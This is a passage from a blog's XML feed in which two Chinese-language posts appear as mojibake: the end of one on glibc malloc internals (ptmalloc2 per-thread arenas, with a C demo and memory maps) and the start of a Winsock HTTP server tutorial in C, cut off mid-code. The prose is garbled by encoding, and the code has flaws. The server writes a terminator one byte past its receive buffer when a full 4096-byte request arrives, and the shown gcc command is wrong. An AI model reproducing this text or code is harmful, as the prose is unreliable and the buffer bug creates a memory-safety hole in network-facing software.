”ç©¶é€™äº›å…§éƒ¨æ©Ÿåˆ¶ï¼Œä»¥äº†è§£mallocå‡½å¼æ˜¯å¦‚ä½•é€²è¡Œè¨˜æ†¶é«”åˆ†é…çš„ï¼Œä¸¦æ¢è¨å…¶å„ªç¼ºé»åŠæ•ˆèƒ½å½±éŸ¿ã€‚</p><p>æ¥ä¸‹ä¾†ï¼Œæˆ‘å€‘å°‡é€²å…¥mallocå‡½å¼çš„åº•å±¤ä¸–ç•Œï¼Œä¸€åŒæ­é–‹å®ƒèƒŒå¾Œçš„ç¥ç§˜é¢ç´—ã€‚æˆ‘å€‘å°‡æ¢è¨å¹¾ç¨®å¸¸è¦‹çš„è¨˜æ†¶é«”åˆ†é…æ¼”ç®—æ³•ï¼ŒåŒ…æ‹¬å›ºå®šåˆ†å‰²ã€å‹•æ…‹åˆ†å‰²ä»¥åŠé é¢åˆ†å‰²ç­‰ç­‰ã€‚é€™äº›æ¼”ç®—æ³•å°‡å¹«åŠ©æˆ‘å€‘æ›´å¥½åœ°ç†è§£mallocå‡½å¼çš„å·¥ä½œæ–¹å¼ï¼Œä¸¦ç­è§£å¦‚ä½•å„ªåŒ–è¨˜æ†¶é«”ä½¿ç”¨æ•ˆèƒ½ã€‚</p><p><img src="https://i.imgur.com/8lB2IrU.png"></p><p>éš¨è‘—é€™å€‹å•é¡Œæˆ‘å€‘å¯ä»¥æ·±å…¥æŒ–æ˜å®ƒçš„åŸç†</p><h2 id="å¦‚ä½•é€²è¡Œè¨˜æ†¶é«”åˆ†é…"><a href="#å¦‚ä½•é€²è¡Œè¨˜æ†¶é«”åˆ†é…" class="headerlink" title="å¦‚ä½•é€²è¡Œè¨˜æ†¶é«”åˆ†é…"></a>å¦‚ä½•é€²è¡Œè¨˜æ†¶é«”åˆ†é…</h2><p>ä½œæ¥­ç³»çµ±ä¸­çš„è¨˜æ†¶é«”åˆ†é…åŠŸèƒ½ä¸»è¦æ˜¯é è¨˜æ†¶é«”åˆ†é…å™¨(Memory Allocator) ä¾†å¯¦ç¾ï¼Œåœ¨æ—©æœŸglibcé è¨­çš„è¨˜æ†¶é«”åˆ†é…å™¨æ˜¯ <code>dlmalloc</code></p><p>ä½†<code>dlmalloc</code> æœ‰å€‹å•é¡Œï¼Œä¸€æ—¦æœ‰å¤šå€‹Threadå‘¼å«Mallocï¼Œåªèƒ½æœ‰ä¸€å€‹Threadå¯ä»¥é€²å…¥Critical Sectionã€‚è€Œæ”¹é€²é€™å€‹å•é¡Œçš„å°±æ˜¯å¾<code>dlmalloc</code>ä¸­forkå‡ºä¾†çš„<code>ptmalloc2</code>ï¼Œä¸€æ—¦å¤šå€‹Threadå‘¼å«mallocï¼Œå‰‡æœƒç«‹å³åˆ†é…è¨˜æ†¶é«”çµ¦å€‹åˆ¥Threadã€‚</p><p>ç”±æ–¼è¨˜æ†¶é«”åˆ†é…çš„ä»»å‹™åŸºæœ¬ä¸Šæ˜¯æœƒå­˜åœ¨æ–¼å¤šå€‹Threadä¹‹é–“ï¼Œå› æ­¤<code>dlmalloc</code>å¾ˆå®¹æ˜“é€ æˆæ•ˆèƒ½ä½è½ã€‚åœ¨<code>ptmalloc2</code>ä¸­ï¼Œå¤šå€‹ThreadåŒæ™‚å‘¼å«mallocæ™‚ï¼Œè¨˜æ†¶é«”æœƒè¢«ç«‹åˆ»åˆ†é…ï¼Œå› ç‚ºæ¯å€‹Threadæœƒç¶­è­·å–®ç¨çš„å †ç–Šå€æ®µï¼Œè€Œç¶­è­·æ¯å€‹å †ç–Šå€æ®µçš„freelist è³‡æ–™çµæ§‹ä¹ŸåŒæ¨£æ˜¯å€‹åˆ¥ç¨ç«‹çš„ã€‚</p><p>é€™ç¨®ç¶­è­·å€‹åˆ¥freelistçµæ§‹ä»¥åŠheapå€æ®µçš„è¡Œç‚ºå«åš <strong>per thread areana</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Per thread arena example. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span>* <span class="title">threadFunc</span><span class="params">(<span class="type">void</span>* arg)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before malloc in thread 1\n&quot;</span>);</span><br><span class="line">        <span class="built_in">getchar</span>();</span><br><span class="line">        <span class="type">char</span>* addr = (<span class="type">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After malloc and before free in thread 1\n&quot;</span>);</span><br><span class="line">        <span class="built_in">getchar</span>();</span><br><span class="line">        <span class="built_in">free</span>(addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After free in thread 1\n&quot;</span>);</span><br><span class="line">        <span class="built_in">getchar</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="type">pthread_t</span> t1;</span><br><span class="line">        <span class="type">void</span>* s;</span><br><span class="line">        <span class="type">int</span> ret;</span><br><span class="line">        <span class="type">char</span>* addr;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Welcome to per thread arena example::%d\n&quot;</span>,<span class="built_in">getpid</span>());</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before malloc in main thread\n&quot;</span>);</span><br><span class="line">        <span class="built_in">getchar</span>();</span><br><span class="line">        addr = (<span class="type">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After malloc and before free in main thread\n&quot;</span>);</span><br><span class="line">        <span class="built_in">getchar</span>();</span><br><span class="line">        <span class="built_in">free</span>(addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After free in main thread\n&quot;</span>);</span><br><span class="line">        <span class="built_in">getchar</span>();</span><br><span class="line">        ret = <span class="built_in">pthread_create</span>(&amp;t1, <span class="literal">NULL</span>, threadFunc, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Thread creation error\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ret = <span class="built_in">pthread_join</span>(t1, &amp;s);</span><br><span class="line">        <span class="keyword">if</span>(ret)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Thread join error\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç·¨è­¯ä¸¦åŸ·è¡Œç¨‹å¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -c mythread -lpthread -o mythread</span><br><span class="line"></span><br><span class="line">./mythread</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/qeTHI16.png"></p><p>å¯ä»¥æ ¹æ“šPIDä¾†æŸ¥çœ‹è¡Œç¨‹çš„è¨˜æ†¶é«”åˆ†é…ç‹€æ³<br>æ ¹æ“šä¸Šé¢ç¨‹å¼è¼¸å‡ºæç¤ºå…¶PIDç‚º74</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/PID/maps</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/ScQz515.png"></p><p>å¯ä»¥è§€å¯Ÿåˆ°Heapå€æ®µæ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">55590b2c9000-55590b2ea000 rw-p 00000000 00:00 0                          [heap]</span><br><span class="line">7fd7ddf25000-7fd7ddf28000 rw-p 00000000 00:00 0</span><br></pre></td></tr></table></figure><p>ç•¶å‘¼å«mallocå¾Œï¼Œå†æ¬¡æŸ¥çœ‹è¨˜æ†¶é«”åˆ†é…çš„æƒ…æ³</p><p><img src="https://i.imgur.com/yy06ND6.png"></p><p><img src="https://i.imgur.com/WpwRXFs.png"></p><p>æˆ‘å€‘å¯ä»¥ç™¼ç¾freeå®Œå¾Œï¼Œæ‰€åˆ†é…åˆ°çš„è¨˜æ†¶é«”ä¸¦ä¸æœƒé¦¬ä¸Šé‡‹æ”¾ï¼Œå…¶å¯¦æœƒå…ˆå°‡è¨˜æ†¶é«”å€åŸŸé‡‹æ”¾çµ¦<strong>glibc malloc library</strong>ï¼Œé€™é‚Šé‡‹æ”¾çš„è¨˜æ†¶é«”å€å¡Š(<strong>Chunk</strong>)æœƒåŠ å…¥åˆ°main arenas bin (åœ¨glibc mallocä¸­ï¼Œfreelistè¢«ç¨±ç‚ºbin)ï¼Œæ¥è‘—å¦‚æœä½¿ç”¨è€…è«‹æ±‚åˆ†é…æ–°çš„è¨˜æ†¶é«”å€å¿«ï¼Œmallocå°±ä¸æœƒå»kernelè«‹æ±‚æ–°çš„è¨˜æ†¶é«”å€å¿«ï¼Œè€Œæ˜¯å»binä¸­æ‰¾ç©ºçš„å€å¡Š(Free chunk)ï¼Œè‹¥binä¸­æ²’æœ‰å¯ç”¨å€å¡Šæ‰æœƒå†å»è·Ÿkernelè«‹æ±‚ã€‚</p><p><img src="https://i.imgur.com/ixhdaI2.png"></p><p><img src="https://i.imgur.com/43OePVQ.png"></p><div class="note info flat"><p>è‡³æ–¼å¾ŒçºŒçš„æ–‡ç« æœƒé€²ä¸€æ­¥å»åˆ†æ: ä½¿ç”¨å“ªç¨®System Call?</p><ul><li>mmap</li><li>brk</li></ul></div><p><img src="https://i.imgur.com/aLNmaSG.png"></p><h2 id="åƒè€ƒè³‡æº"><a href="#åƒè€ƒè³‡æº" class="headerlink" title="åƒè€ƒè³‡æº"></a>åƒè€ƒè³‡æº</h2><p><a href="https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/">https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/</a><br><a href="https://hanfeng.ink/post/understand_glibc_malloc/">https://hanfeng.ink/post/understand_glibc_malloc/</a><br><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/">https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/</a></p>]]></content>
      
      
      <categories>
          
          <category> Deep Dive </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ğŸ§ªé€é Winsock ä¾åºå †ç–Šå‡ºä¸€å€‹HTTP Server</title>
      <link href="/posts/34f1f1b8.html"/>
      <url>/posts/34f1f1b8.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://i.imgur.com/dcWHOfV.png"></p><p>ä¸»è¦æƒ³å¯¦åšçœ‹çœ‹åœ¨Windowsç’°å¢ƒä¸‹é€éWinsocksä¾†å»ºç«‹ç¶²è·¯å±¤çš„Socketä¸¦ä¸”å»é€²è¡Œæ‡‰ç”¨å±¤çš„å”å®šè§£æï¼Œä½¿ç”¨ç¨‹å¼èªè¨€ç‚ºCèªè¨€ï¼Œå¹³å°å‰‡æ˜¯ä½¿ç”¨VSCodeï¼Œæœ¬æ¬¡çš„å­¸ç¿’æ–¹å¼æ˜¯é€éæœ€è¿‘å¾ˆç«ç´…çš„ <a href="https://chat.openai.com/">ChatGPT</a> ä¾†é€²è¡Œå­¸ç¿’ï¼Œä¸¦å†è‡ªè¡ŒDebugå’Œç ”ç©¶èªæ³•ã€‚</p><h2 id="ç¯„ä¾‹ç¨‹å¼ç¢¼"><a href="#ç¯„ä¾‹ç¨‹å¼ç¢¼" class="headerlink" title="ç¯„ä¾‹ç¨‹å¼ç¢¼"></a>ç¯„ä¾‹ç¨‹å¼ç¢¼</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 80 <span class="comment">// HTTPé è¨­ä½¿ç”¨ç«¯å£80</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BACKLOG 10 <span class="comment">// ç­‰å¾…é€£æ¥ä½‡åˆ—çš„æœ€å¤§é•·åº¦</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 4096 <span class="comment">// æ¥æ”¶ç·©è¡å€çš„å¤§å°</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// åˆå§‹åŒ–WinSockåº«</span></span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="type">int</span> result = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line">    <span class="keyword">if</span> (result != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WSAStartup failed: %d\n&quot;</span>, result);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å»ºç«‹Socket</span></span><br><span class="line">    SOCKET listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">    <span class="keyword">if</span> (listenSocket == INVALID_SOCKET) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;socket failed: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç¶å®šSocketåˆ°æœ¬åœ°åœ°å€å’Œç«¯å£</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serverAddress</span>;</span></span><br><span class="line">    serverAddress.sin_family = AF_INET;</span><br><span class="line">    serverAddress.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">    serverAddress.sin_port = htons(PORT);</span><br><span class="line">    result = bind(listenSocket, (SOCKADDR*)&amp;serverAddress, <span class="keyword">sizeof</span>(serverAddress));</span><br><span class="line">    <span class="keyword">if</span> (result == SOCKET_ERROR) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bind failed: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        closesocket(listenSocket);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç›£è½Socket</span></span><br><span class="line">    result = listen(listenSocket, BACKLOG);</span><br><span class="line">    <span class="keyword">if</span> (result == SOCKET_ERROR) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;listen failed: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        closesocket(listenSocket);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é˜»å¡ç­‰å¾…å®¢æˆ¶ç«¯çš„é€£æ¥</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Waiting for client to connect...\n&quot;</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">clientAddress</span>;</span></span><br><span class="line">    <span class="type">int</span> clientAddressLen = <span class="keyword">sizeof</span>(clientAddress);</span><br><span class="line">    SOCKET clientSocket = accept(listenSocket, (SOCKADDR*)&amp;clientAddress, &amp;clientAddressLen);</span><br><span class="line">    <span class="keyword">if</span> (clientSocket == INVALID_SOCKET) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;accept failed: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        closesocket(listenSocket);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Client connected.\n&quot;</span>);</span><br><span class="line">        <span class="comment">// è®€å–å®¢æˆ¶ç«¯ç™¼é€çš„è«‹æ±‚</span></span><br><span class="line">    <span class="type">char</span> buffer[BUFFER_SIZE];</span><br><span class="line">    <span class="type">int</span> recvLen = recv(clientSocket, buffer, BUFFER_SIZE, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (recvLen &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;recv failed: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        closesocket(clientSocket);</span><br><span class="line">        closesocket(listenSocket);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    buffer[recvLen] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Received request:\n%s&quot;</span>, buffer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è§£æHTTPè«‹æ±‚</span></span><br><span class="line">    <span class="type">char</span> method[<span class="number">16</span>];</span><br><span class="line">    <span class="type">char</span> url[<span class="number">256</span>];</span><br><span class="line">    <span class="type">char</span> version[<span class="number">16</span>];</span><br><span class="line">    sscanf_s(buffer, <span class="string">&quot;%s %s %s&quot;</span>, method, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="keyword">sizeof</span>(method), url, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="keyword">sizeof</span>(url), version, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="keyword">sizeof</span>(version));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parsed request: method=%s, url=%s, version=%s\n&quot;</span>, method, url, version);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ§‹é€ HTTPå›æ‡‰</span></span><br><span class="line">    <span class="type">char</span> response[BUFFER_SIZE];</span><br><span class="line">    sprintf_s(response, BUFFER_SIZE, <span class="string">&quot;HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nHello, World!&quot;</span>);</span><br><span class="line">    <span class="type">int</span> responseLen = (<span class="type">int</span>)<span class="built_in">strlen</span>(response);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ç™¼é€HTTPå›æ‡‰</span></span><br><span class="line">    result = send(clientSocket, response, responseLen, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (result == SOCKET_ERROR) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;send failed: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        closesocket(clientSocket);</span><br><span class="line">        closesocket(listenSocket);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Sent response:\n%s&quot;</span>, response);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é—œé–‰Socket</span></span><br><span class="line">    closesocket(clientSocket);</span><br><span class="line">    closesocket(listenSocket);</span><br><span class="line">    WSACleanup();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ç¨‹å¼ä¸»è¦æµç¨‹"><a href="#ç¨‹å¼ä¸»è¦æµç¨‹" class="headerlink" title="ç¨‹å¼ä¸»è¦æµç¨‹"></a>ç¨‹å¼ä¸»è¦æµç¨‹</h2><ol><li>åˆå§‹åŒ– WinSock å‡½å¼åº«</li><li>ç›£è½Socketç­‰å¾…clientç«¯é€£æ¥</li><li>æ¥æ”¶clientè«‹æ±‚ä¸¦è§£æå…¶Methodã€URLä»¥åŠå”å®šç‰ˆæœ¬</li><li>å»ºæ§‹HTTP Responseï¼Œç™¼é€çµ¦clientç«¯</li><li>é—œé–‰socketä¸¦æ¸…ç†Winsockè³‡æº</li></ol><h2 id="ç¨‹å¼è§£é‡‹"><a href="#ç¨‹å¼è§£é‡‹" class="headerlink" title="ç¨‹å¼è§£é‡‹"></a>ç¨‹å¼è§£é‡‹</h2><ul><li>é¦–å…ˆä¸€å®šè¦å¼•å…¥ &lt;winsock2.h&gt; æ¨™é ­æª”</li><li>æ¥è‘—è¼‰å…¥WinSock DLL  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="type">int</span> result = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line"><span class="keyword">if</span> (result != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// éŒ¯èª¤è™•ç†</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>å»ºç«‹socket  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å»ºç«‹Socket</span></span><br><span class="line">SOCKET listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"><span class="keyword">if</span> (listenSocket == INVALID_SOCKET) &#123;</span><br><span class="line">    <span class="comment">//éŒ¯èª¤è™•ç†</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>ç¶å®šsocketåˆ°æœ¬åœ°ä½å€èˆ‡port  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ç¶å®šSocketåˆ°æœ¬åœ°åœ°å€å’Œç«¯å£</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serverAddress</span>;</span></span><br><span class="line">serverAddress.sin_family = AF_INET;</span><br><span class="line">serverAddress.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">serverAddress.sin_port = htons(PORT);</span><br><span class="line">result = bind(listenSocket, (SOCKADDR*)&amp;serverAddress, <span class="keyword">sizeof</span>(serverAddress));</span><br><span class="line"><span class="keyword">if</span> (result == SOCKET_ERROR) &#123;</span><br><span class="line">    <span class="comment">//éŒ¯èª¤è™•ç†</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>ç›£è½Socket  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">result = listen(listenSocket, BACKLOG);</span><br><span class="line"><span class="keyword">if</span> (result == SOCKET_ERROR) &#123;</span><br><span class="line">    <span class="comment">//éŒ¯èª¤è™•ç†</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>ç­‰å¾…å®¢æˆ¶ç«¯é€£æ¥  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Waiting for client to connect...\n&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">clientAddress</span>;</span></span><br><span class="line"><span class="type">int</span> clientAddressLen = <span class="keyword">sizeof</span>(clientAddress);</span><br><span class="line">SOCKET clientSocket = accept(listenSocket, (SOCKADDR*)&amp;clientAddress, &amp;clientAddressLen);</span><br><span class="line"><span class="keyword">if</span> (clientSocket == INVALID_SOCKET) &#123;</span><br><span class="line">  <span class="comment">//éŒ¯èª¤è™•ç†</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Client connected.\n&quot;</span>);</span><br></pre></td></tr></table></figure></li><li>è®€å–å®¢æˆ¶ç«¯è«‹æ±‚  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buffer[BUFFER_SIZE];</span><br><span class="line"><span class="type">int</span> recvLen = recv(clientSocket, buffer, BUFFER_SIZE, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (recvLen &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">   <span class="comment">//éŒ¯èª¤è™•ç†</span></span><br><span class="line">&#125;</span><br><span class="line">buffer[recvLen] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Received request:\n%s&quot;</span>, 